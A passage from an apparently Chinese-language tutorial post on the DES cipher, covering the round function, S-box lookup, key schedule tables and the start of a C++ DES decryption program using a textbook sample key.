656Q517 641 513 637H475Q406 636 394 628Q387 624 380 600T313 336Q297 271 279 198T252 88L243 52Q243 48 252 48T311 46H328Q360 46 379 47T428 54T478 72T522 106T564 161Q580 191 594 228T611 270Q616 273 628 273H641Q647 264 647 262T627 203T583 83T557 9Q555 4 553 3T537 0T494 -1Q483 -1 418 -1T294 0H116Q32 0 32 10Q32 17 34 24Q39 43 44 45Q48 46 59 46H65Q92 46 125 49Q139 52 144 61Q147 65 216 339T285 628Q285 635 228 637Z"/></g><g data-mml-node="TeXAtom" transform="translate(714,-150) scale(0.707)" data-mjx-texclass="ORD"><g data-mml-node="mi"><path data-c="1D456" d="M184 600Q184 624 203 642T247 661Q265 661 277 649T290 619Q290 596 270 577T226 557Q211 557 198 567T184 600ZM21 287Q21 295 30 318T54 369T98 420T158 442Q197 442 223 419T250 357Q250 340 236 301T196 196T154 83Q149 61 149 51Q149 26 166 26Q175 26 185 29T208 43T235 78T260 137Q263 149 265 151T282 153Q302 153 302 143Q302 135 293 112T268 61T223 11T161 -11Q129 -11 102 10T74 74Q74 91 79 106T122 220Q160 321 166 341T173 380Q173 404 156 404H154Q124 404 99 371T61 287Q60 286 59 284T58 281T56 279T53 278T49 278T41 278H27Q21 284 21 287Z"/></g><g data-mml-node="mo" transform="translate(345,0)"><path data-c="2212" d="M84 237T84 250T98 270H679Q694 262 694 250T679 230H98Q84 237 84 250Z"/></g><g data-mml-node="mn" transform="translate(1123,0)"><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z"/></g></g></g><g data-mml-node="mo" transform="translate(4553.4,0)"><path data-c="2295" d="M56 250Q56 394 156 488T384 583Q530 583 626 485T722 250Q722 110 625 14T390 -83Q249 -83 153 14T56 250ZM364 542Q308 539 251 509T148 418T96 278V270H369V542H364ZM681 278Q675 338 650 386T592 462T522 509T458 535T412 542H409V270H681V278ZM96 222Q104 150 139 95T219 12T302 -29T366 -42H369V230H96V222ZM681 222V230H409V-42H412Q429 -42 456 -36T521 -10T590 37T649 113T681 222Z"/></g><g data-mml-node="mi" transform="translate(5553.6,0)"><path data-c="1D439" d="M48 1Q31 1 31 11Q31 13 34 25Q38 41 42 43T65 46Q92 46 125 49Q139 52 144 61Q146 66 215 342T285 622Q285 629 281 629Q273 632 228 634H197Q191 640 191 642T193 659Q197 676 203 680H742Q749 676 749 669Q749 664 736 557T722 447Q720 440 702 440H690Q683 445 683 453Q683 454 686 477T689 530Q689 560 682 579T663 610T626 626T575 633T503 634H480Q398 633 393 631Q388 629 386 623Q385 622 352 492L320 363H375Q378 363 398 363T426 364T448 367T472 374T489 386Q502 398 511 419T524 457T529 475Q532 480 548 480H560Q567 475 567 470Q567 467 536 339T502 207Q500 200 482 200H470Q463 206 463 212Q463 215 468 234T473 274Q473 303 453 310T364 317H309L277 190Q245 66 245 60Q245 46 334 46H359Q365 40 365 39T363 19Q359 6 353 0H336Q295 2 185 2Q120 2 86 2T48 1Z"/></g><g data-mml-node="mo" transform="translate(6302.6,0)"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"/></g><g data-mml-node="msub" transform="translate(6691.6,0)"><g data-mml-node="mi"><path data-c="1D445" d="M230 637Q203 637 198 638T193 649Q193 676 204 682Q206 683 378 683Q550 682 564 680Q620 672 658 652T712 606T733 563T739 529Q739 484 710 445T643 385T576 351T538 338L545 333Q612 295 612 223Q612 212 607 162T602 80V71Q602 53 603 43T614 25T640 16Q668 16 686 38T712 85Q717 99 720 102T735 105Q755 105 755 93Q755 75 731 36Q693 -21 641 -21H632Q571 -21 531 4T487 82Q487 109 502 166T517 239Q517 290 474 313Q459 320 449 321T378 323H309L277 193Q244 61 244 59Q244 55 245 54T252 50T269 48T302 46H333Q339 38 339 37T336 19Q332 6 326 0H311Q275 2 180 2Q146 2 117 2T71 2T50 1Q33 1 33 10Q33 12 36 24Q41 43 46 45Q50 46 61 46H67Q94 46 127 49Q141 52 146 61Q149 65 218 339T287 628Q287 635 230 637ZM630 554Q630 586 609 608T523 636Q521 636 500 636T462 637H440Q393 637 386 627Q385 624 352 494T319 361Q319 360 388 360Q466 361 492 367Q556 377 592 426Q608 449 619 486T630 554Z"/></g><g data-mml-node="TeXAtom" transform="translate(792,-150) scale(0.707)" data-mjx-texclass="ORD"><g data-mml-node="mi"><path data-c="1D456" d="M184 600Q184 624 203 642T247 661Q265 661 277 649T290 619Q290 596 270 577T226 557Q211 557 198 567T184 600ZM21 287Q21 295 30 318T54 369T98 420T158 442Q197 442 223 419T250 357Q250 340 236 301T196 196T154 83Q149 61 149 51Q149 26 166 26Q175 26 185 29T208 43T235 78T260 137Q263 149 265 151T282 153Q302 153 302 143Q302 135 293 112T268 61T223 11T161 -11Q129 -11 102 10T74 74Q74 91 79 106T122 220Q160 321 166 341T173 380Q173 404 156 404H154Q124 404 99 371T61 287Q60 286 59 284T58 281T56 279T53 278T49 278T41 278H27Q21 284 21 287Z"/></g><g data-mml-node="mo" transform="translate(345,0)"><path data-c="2212" d="M84 237T84 250T98 270H679Q694 262 694 250T679 230H98Q84 237 84 250Z"/></g><g data-mml-node="mn" transform="translate(1123,0)"><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z"/></g></g></g><g data-mml-node="mo" transform="translate(8681.2,0)"><path data-c="2C" d="M78 35T78 60T94 103T137 121Q165 121 187 96T210 8Q210 -27 201 -60T180 -117T154 -158T130 -185T117 -194Q113 -194 104 -185T95 -172Q95 -168 106 -156T131 -126T157 -76T173 -3V9L172 8Q170 7 167 6T161 3T152 1T140 0Q113 0 96 17Z"/></g><g data-mml-node="msub" transform="translate(9125.9,0)"><g data-mml-node="mi"><path data-c="1D43E" d="M285 628Q285 635 228 637Q205 637 198 638T191 647Q191 649 193 661Q199 681 203 682Q205 683 214 683H219Q260 681 355 681Q389 681 418 681T463 682T483 682Q500 682 500 674Q500 669 497 660Q496 658 496 654T495 648T493 644T490 641T486 639T479 638T470 637T456 637Q416 636 405 634T387 623L306 305Q307 305 490 449T678 597Q692 611 692 620Q692 635 667 637Q651 637 651 648Q651 650 654 662T659 677Q662 682 676 682Q680 682 711 681T791 680Q814 680 839 681T869 682Q889 682 889 672Q889 650 881 642Q878 637 862 637Q787 632 726 586Q710 576 656 534T556 455L509 418L518 396Q527 374 546 329T581 244Q656 67 661 61Q663 59 666 57Q680 47 717 46H738Q744 38 744 37T741 19Q737 6 731 0H720Q680 3 625 3Q503 3 488 0H478Q472 6 472 9T474 27Q478 40 480 43T491 46H494Q544 46 544 71Q544 75 517 141T485 216L427 354L359 301L291 248L268 155Q245 63 245 58Q245 51 253 49T303 46H334Q340 37 340 35Q340 19 333 5Q328 0 317 0Q314 0 280 1T180 2Q118 2 85 2T49 1Q31 1 31 11Q31 13 34 25Q38 41 42 43T65 46Q92 46 125 49Q139 52 144 61Q147 65 216 339T285 628Z"/></g><g data-mml-node="mi" transform="translate(882,-150) scale(0.707)"><path data-c="1D456" d="M184 600Q184 624 203 642T247 661Q265 661 277 649T290 619Q290 596 270 577T226 557Q211 557 198 567T184 600ZM21 287Q21 295 30 318T54 369T98 420T158 442Q197 442 223 419T250 357Q250 340 236 301T196 196T154 83Q149 61 149 51Q149 26 166 26Q175 26 185 29T208 43T235 78T260 137Q263 149 265 151T282 153Q302 153 302 143Q302 135 293 112T268 61T223 11T161 -11Q129 -11 102 10T74 74Q74 91 79 106T122 220Q160 321 166 341T173 380Q173 404 156 404H154Q124 404 99 371T61 287Q60 286 59 284T58 281T56 279T53 278T49 278T41 278H27Q21 284 21 287Z"/></g></g><g data-mml-node="mo" transform="translate(10301.8,0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"/></g></g></g></svg></mjx-container></p>
<p><strong>函数F(R,K)计算过程</strong></p>
<p><img src="https://gitee.com/kingwempity/images/raw/master/images/%E5%87%BD%E6%95%B0F(R,K)%E8%AE%A1%E7%AE%97%E8%BF%87%E7%A8%8B.png" alt="函数F(R,K)计算过程"></p>
<p><strong>DES的S盒</strong></p>
<blockquote>
<p>​	每个S盒的输入长为6比特、输出长为4比特，其变换关系如下图定义，每个S盒给出了4个代换（由一个表的4行给出）。</p>
<p>​	对每个盒Si，其6比特输入中，第1个和第6个比特形成一个2位二进制数，用来选择Si的四个代换中的一个。6比特输入中，中间4位用来选择列。</p>
</blockquote>
<p><img src="https://gitee.com/kingwempity/images/raw/master/images/DES%E7%9A%84S%E7%9B%92.png" alt="DES的S盒"></p>
<p>例如输入<u>1</u> 0101 <u>1</u></p>
<p>行:<strong>下划线两位</strong>：11B=3行</p>
<p>列: <strong>无下划线的四位</strong>：0101B=5列</p>
<p>输出定位：9=<strong>1001B</strong></p>
<h3 id="密钥的产生"><a href="#密钥的产生" class="headerlink" title="密钥的产生"></a>密钥的产生</h3><p><strong>DES密钥编排中使用的表</strong></p>
<img src="https://gitee.com/kingwempity/images/raw/master/images/DES密钥编排中使用的表.png" alt="DES密钥编排中使用的表" style="zoom:80%;">

<p><img src="https://gitee.com/kingwempity/images/raw/master/images/DES%E5%B7%A6%E5%BE%AA%E7%8E%AF%E7%A7%BB%E4%BD%8D%E4%BD%8D%E6%95%B0.png" alt="DES左循环移位位数"></p>
<h3 id="解密"><a href="#解密" class="headerlink" title="解密"></a>解密</h3><p>DES的解密和加密使用同一算法，但子密钥使用的顺序相反。</p>
<h3 id="DES整体加密结构流程图"><a href="#DES整体加密结构流程图" class="headerlink" title="DES整体加密结构流程图"></a>DES整体加密结构流程图</h3><img src="https://gitee.com/kingwempity/images/raw/master/images/DES整体加密结构流程图.png" alt="DES整体加密结构流程图">

<h3 id="DES解密代码【C-】"><a href="#DES解密代码【C-】" class="headerlink" title="DES解密代码【C++】"></a>DES解密代码【C++】</h3><blockquote>
<p><strong>密文C:85E813540F0AB405</strong><br><strong>密钥K为:133457799BBCDFF1</strong></p>
</blockquote>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iomanip&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/******************************求密钥部分**************************************/</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//置换选择1   </span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">Permutation_1</span><span class="params">(<span class="type">int</span> Before[], <span class="type">int</span> After[])</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line">	<span class="type">int</span> Permutation_1[<span class="number">56</span>] = { <span class="number">57</span>,<span class="number">49</span>,<span class="number">41</span>,<span class="number">33</span>,<span class="number">25</span>,<span class="number">17</span>,<span class="number">9</span>,   <span class="number">1</span>,<span class="number">58</span>,<span class="number">50</span>,<span class="number">42</span>,<span class="number">34</span>,<span class="number">26</span>,<span class="number">18</span>,  <span class="number">10</span>,<span class="number">2</span>,<span class="number">59</span>,<span class="number">51</span>,<span class="number">43</span>,<span class="number">35</span>,<span class="number">27</span>,    <span class="number">19</span>,<span class="number">11</span>,<span class="number">3</span>,<span class="number">60</span>,<span class="number">52</span>,<span class="number">44</span>,<span class="number">36</span>,    <span class="number">63</span>,<span class="number">55</span>,<span class="number">47</span>,<span class="number">39</span>,<span class="number">31</span>,<span class="number">23</span>,<span class="number">15</span>,   <span class="number">7</span>,<span class="number">62</span>,<span class="number">54</span>,<span class="number">46</span>,<span class="number">38</span>,<span class="number">30</span>,<span class="number">22</span>,    <span class="number">14</span>,<span class="number">6</span>,<span class="number">61</span>,<span class="number">53</span>,<span class="number">45</span>,<span class="number">37</span>,<span class="number">29</span>,     <span class="number">21</span>,<span class="number">13</span>,<span class="number">5</span>,<span class="number">28</span>,<span class="number">20</span>,<span class="number">12</span>,<span class="number">4</span> };</span><br><span class="line">	<span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">56</span>; i++)</span><br><span class="line">	{</span><br><span class="line">		After[i] = Before[Permutation_1[i] - <span class="number">1</span>];</span><br><span class="line">	}</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="comment">//56位数组   分割成    左右两个28位数组   </span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">Segmentation_56_28</span><span class="params">(<span class="type">int</span> Input[], <span class="type">int</span> C_Output[], <span class="type">int</span> D_Output[])</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line">	<span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">28</span>; i++)</span><br><span class="line">	{</span><br><span class="line">		C_Output[i] = Input[i];</span><br><span class="line">		D_Output[i] = Input[i + <span class="number">28</span>];</span><br><span class="line">	}</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="comment">//循环左移函数</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">Circulation_Left_Move</span><span class="params">(<span class="type">int</span> Move_bits, <span class="type">int</span> Input[<span class="number">28</span>])</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line">	<span class="type">int</span> a = Input[<span class="number">0</span>];</span><br><span class="line">	<span class="type">int</span> b = Input[<span class="number">1</span>];</span><br><span class="line"></span><br><span class="line">	<span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">28</span> - Move_bits; i++)</span><br><span class="line">	{</span><br><span class="line">		Input[i] = Input[i + Move_bits];</span><br><span class="line">	}</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (Move_bits == <span class="number">1</span>)</span><br><span class="line">	{</span><br><span class="line">		Input[<span class="number">27</span>] = a;</span><br><span class="line">	}</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (Move_bits == <span class="number">2</span>)</span><br><span class="line">	{</span><br><span class="line">		Input[<span class="number">26</span>] = a;</span><br><span class="line">		Input[<span class="number">27</span>] = b;</span><br><span class="line">	}</span><br><span class="line"></span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="comment">//两个28位数组组成  56位数组 </span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">Combine_C_And_D</span><span class="params">(<span class="type">int</span> Left_Output[<span class="number">28</span>], <span class="type">int</span> Right_Output[<span class="number">28</span>], <span class="type">int</span> Output[<span class="number">56</span>])</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line">	<span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">28</span>; i++)</span><br><span class="line">	{</span><br><span class="line">		Output[i] = Left_Output[i];</span><br><span class="line">		Output[i + <span class="number">28</span>] = Right_Output[i];</span><br><span class="line">	}</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="comment">//置换选择2 </span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">Permutation_2</span><span class="params">(<span class="type">int</span> Left_And_right[<span class="number">56</span>], <span class="type">int</span> K_count, <span class="type">int</span> K[][<span class="number">48</span>])</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line">	<span class="type">int</span> Permutation_2[<span class="number">48</span>] = { <span class="number">14</span>,<span class="number">17</span>,<span class="number">11</span>,<span class="number">24</span>,<span class="number">1</span>,<span class="number">5</span>,   <span class="number">3</span>,<span class="number">28</span>,<span class="number">15</span>,<span class="number">6</span>,<span class="number">21</span>,<span class="number">10</span>,   <span class="number">23</span>,<span class="number">19</span>,<span class="number">12</span>,<span class="number">4</span>,<span class="number">26</span>,<span class="number">8</span>,   <span class="number">16</span>,<span class="number">7</span>,<span class="number">27</span>,<span class="number">20</span>,<span class="number">13</span>,<span class="number">2</span>,    <span class="number">41</span>,<span class="number">52</span>,<span class="number">31</span>,<span class="number">37</span>,<span class="number">47</span>,<span class="number">55</span>,    <span class="number">30</span>,<span class="number">40</span>,<span class="number">51</span>,<span class="number">45</span>,<span class="number">33</span>,<span class="number">48</span>,   <span class="number">44</span>,<span class="number">49</span>,<span class="number">39</span>,<span class="number">56</span>,<span class="number">34</span>,<span class="number">53</span>,   <span class="number">46</span>,<span class="number">42</span>,<span class="number">50</span>,<span class="number">36</span>,<span class="number">29</span>,<span class="number">32</span> };</span><br><span class="line">	<span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">48</span>; i++)</span><br><span class="line">	{</span><br><span class="line">		K[K_count][i] = Left_And_right[Permutation_2[i]<span class="number">-1</span>];</span><br><span class="line">	}</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="comment">//轮函数求密钥K[16][48]    (一轮)    </span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">Wheel_Structure_Key</span><span class="params">(<span class="type">int</span> K_count, <span class="type">int</span> Move_bits[], <span class="type">int</span> K[<span class="number">16</span>][<span class="number">48</span>], <span class="type">int</span> C_Input[<span class="number">28</span>], <span class="type">int</span> D_Input[<span class="number">28</span>])</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line">	<span class="comment">//C_Input[28], int D_Input[28]按照   由轮数确定的循环移动个数来进行移位</span></span><br><span class="line">	<span class="built_in">Circulation_Left_Move</span>(Move_bits[K_count], C_Input);</span><br><span class="line">	<span class="built_in">Circulation_Left_Move</span>(Move_bits[K_count], D_Input);</span><br><span class="line">	cout &lt;&lt; <span class="string">"第"</span> &lt;&lt; K_count &lt;&lt;<span class="built_in">setw</span>(<span class="number">2</span>)&lt;&lt;<span class="string">"轮子密钥："</span>;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/*cout &lt;&lt; "左半边C[28]=";</span></span><br><span class="line"><span class="comment">	for (int i = 0; i &lt; 28; i++)</span></span><br><span class="line"><span class="comment">	{</span></span><br><span class="line"><span class="comment">		cout &lt;&lt; C_Input[i];</span></span><br><span class="line"><span class="comment">	}</span></span><br><span class="line"><span class="comment">	cout &lt;&lt; endl;</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">	cout &lt;&lt; "右半边D[28]=";</span></span><br><span class="line"><span class="comment">	for (int i = 0; i &lt; 28; i++)</span></span><br><span class="line"><span class="comment">	{</span></span><br><span class="line"><span class="comment">		cout &lt;&lt; D_Input[i];</span></span><br><span class="line"><span class="comment">	}</span></span><br><span class="line"><span class="comment">	cout &lt;&lt; endl;*/</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">//两个28位数组组成  56位数组 </span></span><br><span class="line">	<span class="type">int</span> C_And_D_Output[<span class="number">56</span>];</span><br><span class="line">	<span class="built_in">Combine_C_And_D</span>(C_Input, D_Input, C_And_D_Output);</span><br><span class="line">	</span><br><span class="line">	<span class="comment">/*cout &lt;&lt; "C_And_D_Output[]=";</span></span><br><span class="line"><span class="comment">	for (int i = 0; i &lt; 56; i++)</span></span><br><span class="line"><span class="comment">	{</span></span><br><span class="line"><span class="comment">		cout &lt;&lt; C_And_D_Output[i];</span></span><br><span class="line"><span class="comment">	}</span></span><br><span class="line"><span class="comment">	cout &lt;&lt; endl;*/</span></span><br><span class="line">	</span><br><span class="line">	<span class="comment">//置换选择2   生成密钥K[k_count][]</span></span><br><span class="line">	<span class="built_in">Permutation_2</span>(C_And_D_Output, K_count, K);</span><br><span class="line">	cout &lt;&lt; <span class="string">"K["</span>&lt;&lt;K_count&lt;&lt;<span class="string">"][48]="</span>;</span><br><span class="line">	<span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">48</span>; i++)</span><br><span class="line">	{</span><br><span class="line">		cout &lt;&lt; K[K_count][i];</span><br><span class="line">	}</span><br><span class="line">	cout &lt;&lt; endl;</span><br><span class="line"></span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="comment">//制作所有16轮密钥K[16][48]   </span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">Make_All_Key</span><span class="params">(<span class="type">int</span> Key[], <span class="type">int</span> K[<span class="number">16</span>][<span class="number">48</span>])</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line">	<span class="comment">//制作有效的56位密钥//OK</span></span><br><span class="line">	<span class="type">int</span> Useful_Key[<span class="number">56</span>];</span><br><span class="line">	<span class="built_in">Permutation_1</span>(Key, Useful_Key);</span><br><span class="line">	</span><br><span class="line">	<span class="comment">///</span></span><br><span class="line">	<span class="comment">/*	cout &lt;&lt; "64位密钥Key[64]去除8位校验码后的56位Useful_Key[56]=";</span></span><br><span class="line"><span class="comment">	for (int i = 0; i &lt; 56; i++)</span></span><br><span class="line"><span class="comment">	{</span></span><br><span class="line"><span class="comment">		cout &lt;&lt; Useful_Key[i];</span></span><br><span class="line"><span class="comment">	}</span></span><br><span class="line"><span class="comment">	cout &lt;&lt; endl; */</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	<span class="comment">//将56位有效密钥对半分为两密钥</span></span><br><span class="line">	<span class="type">int</span> C[<span class="number">28</span>] ;</span><br><span class="line">	<span class="type">int</span> D[<span class="number">28</span>];</span><br><span class="line">	<span class="built_in">Segmentation_56_28</span>(Useful_Key, C, D);</span><br><span class="line">	<span class="comment">//</span></span><br><span class="line">	<span class="comment">/*cout &lt;&lt; "Useful_Key[56]的左半边C[28]=";</span></span><br><span class="line"><span class="comment">	for (int i = 0; i &lt; 28; i++)</span></span><br><span class="line"><span class="comment">	{</span></span><br><span class="line"><span class="comment">		cout &lt;&lt; C[i];</span></span><br><span class="line"><span class="comment">	}</span></span><br><span class="line"><span class="comment">	cout &lt;&lt; endl;</span></span><br><span class="line"><span class="comment">	cout &lt;&lt; "Useful_Key[56]的右半边D[28]=";</span></span><br><span class="line"><span class="comment">	for (int i = 0; i &lt; 28; i++)</span></span><br><span class="line"><span class="comment">	{</span></span><br><span class="line"><span class="comment">		cout &lt;&lt; D[i];</span></span><br><span class="line"><span class="comment">	}</span></span><br><span class="line"><span class="comment">	cout &lt;&lt; endl;*/</span></span><br><span class="line">	</span><br><span class="line">	<span class="comment">//左循环移位位数数组</span></span><br><span class="line">	<span class="type">int</span> Move_bits[<span class="number">16</span>] = { <span class="number">1</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">2</span>,<span class="number">2</span>,<span class="number">2</span>,<span class="number">2</span>,<span class="number">2</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">2</span>,<span class="number">2</span>,<span class="number">2</span>,<span class="number">2</span>,<span class="number">2</span>,<span class="number">1</span> };</span><br><span class="line">	<span class="keyword">for</span> (<span class="type">int</span> K_count = <span class="number">0</span>; K_count &lt; <span class="number">16</span>; K_count++)</span><br><span class="line">	{</span><br><span class="line">		<span class="built_in">Wheel_Structure_Key</span>(K_count, Move_bits, K, C, D);		</span><br><span class="line">	}</span><br><span class="line"></span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/******************************DES   明文加密，密文解密    部分**************************************/</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//初始置换IP   </span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">Initial_Permutation_IP</span><span class="params">(<span class="type">int</span> Before[<span class="number">64</span>],<span class="type">int</span> After[<span class="number">64</span>])</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line">	<span class="type">int</span> IP[<span class="number">64</span>] = {<span class="number">58</span>,<span class="number">50</span>,<span class="number">42</span>,<span class="number">34</span>,<span class="number">26</span>,<span class="number">18</span>,<span class="number">10</span>,<span class="number">2</span>,    <span class="number">60</span>,<span class="number">52</span>,<span class="number">44</span>,<span class="number">36</span>,<span class="number">28</span>,<span class="number">20</span>,<span class="number">12</span>,<span class="number">4</span>,   <span class="number">62</span>,<span class="number">54</span>,<span class="number">46</span>,<span class="number">38</span>,<span class="number">30</span>,<span class="number">22</span>,<span class="number">14</span>,<span class="number">6</span>    ,<span class="number">64</span>,<span class="number">56</span>,<span class="number">48</span>,<span class="number">40</span>,<span class="number">32</span>,<span class="number">24</span>,<span class="number">16</span>,<span class="number">8</span>,     <span class="number">57</span>,<span class="number">49</span>,<span class="number">41</span>,<span class="number">33</span>,<span class="number">25</span>,<span class="number">17</span>,<span class="number">9</span>,<span class="number">1</span>,     <span class="number">59</span>,<span class="number">51</span>,<span class="number">43</span>,<span class="number">35</span>,<span class="number">27</span>,<span class="number">19</span>,<span class="number">11</span>,<span class="number">3</span>,   <span class="number">61</span>,<span class="number">53</span>,<span class="number">45</span>,<span class="number">37</span>,<span class="number">29</span>,<span class="number">21</span>,<span class="number">13</span>,<span class="number">5</span>,   <span class="number">63</span>,<span class="number">55</span>,<span class="number">47</span>,<span class="number">39</span>,<span class="number">31</span>,<span class="number">23</span>,<span class="number">15</span>,<span class="number">7</span>};</span><br><span class="line">	<span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">64</span>; i++)</span><br><span class="line">	{</span><br><span class="line">		After[i] = Before[IP[i]<span class="number">-1</span>];</span><br><span class="line">	}</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="comment">//64位数组   分割成    左右两个32位数组   </span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">Segmentation_64_32</span><span class="params">(<span class="type">int</span> Input[<span class="number">64</span>],<span class="type">int</span> Left_Output[<span class="number">32</span>],<span class="type">int</span> Right_Output[<span class="number">32</span>])</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line">	<span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">32</span>; i++)</span><br><span class="line">	{</span><br><span class="line">		Left_Output[i] = Input[i];</span><br><span class="line">		Right_Output[i] = Input[i+<span class="number">32</span>];</span><br><span class="line">	}</span><br><span class="line"></span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="comment">//扩展置换运算E</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">Extended_Arithmetic_Permutation_E</span><span class="params">(<span class="type">int</span> BeforeE[<span class="number">32</span>],<span class="type">int</span> AfterE[<span class="number">48</span>])</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line">	<span class="type">int</span> Extended_Arithmetic_Permutation_E[<span class="number">48</span>] = {<span class="number">32</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,    <span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">8</span>,<span class="number">9</span>,   <span class="number">8</span>,<span class="number">9</span>,<span class="number">10</span>,<span class="number">11</span>,<span class="number">12</span>,<span class="number">13</span>,  <span class="number">12</span>,<span class="number">13</span>,<span class="number">14</span>,<span class="number">15</span>,<span class="number">16</span>,<span class="number">17</span>,   <span class="number">16</span>,<span class="number">17</span>,<span class="number">18</span>,<span class="number">19</span>,<span class="number">20</span>,<span class="number">21</span>,   <span class="number">20</span>,<span class="number">21</span>,<span class="number">22</span>,<span class="number">23</span>,<span class="number">24</span>,<span class="number">25</span>,   <span class="number">24</span>,<span class="number">25</span>,<span class="number">26</span>,<span class="number">27</span>,<span class="number">28</span>,<span class="number">29</span>,  <span class="number">28</span>,<span class="number">29</span>,<span class="number">30</span>, <span class="number">31</span>,<span class="number">32</span>,<span class="number">1</span>};</span><br><span class="line">	<span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">48</span>; i++)</span><br><span class="line">	{</span><br><span class="line">		AfterE[i] = BeforeE[Extended_Arithmetic_Permutation_E[i]<span class="number">-1</span>];</span><br><span class="line">	}</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="comment">//置换P</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">Permutation_P</span><span class="params">(<span class="type">int</span> BeforeP[<span class="number">32</span>], <span class="type">int</span> AfterP[<span class="number">32</span>])</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line">	<span class="type">int</span> Permutation_P[<span class="number">32</span>] = {<span class="number">16</span>,<span class="number">7</span>,<span class="number">20</span>,<span class="number">21</span>,   <span class="number">29</span>,<span class="number">12</span>,<span class="number">28</span>,<span class="number">17</span>,  <span class="number">1</span>,<span class="number">15</span>,<span class="number">23</span>,<span class="number">26</span>,    <span class="number">5</span>,<span class="number">18</span>,<span class="number">31</span>,<span class="number">10</span>,  <span class="number">2</span>,<span class="number">8</span>,<span class="number">24</span>,<span class="number">14</span>,    <span class="number">32</span>,<span class="number">27</span>,<span class="number">3</span>,<span class="number">9</span>,     <span class="number">19</span>,<span class="number">13</span>,<span class="number">30</span>,<span class="number">6</span>,     <span class="number">22</span>,<span class="number">11</span>,<span class="number">4</span>,<span class="number">25</span> };</span><br><span class="line">	<span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">32</span>; i++)</span><br><span class="line">	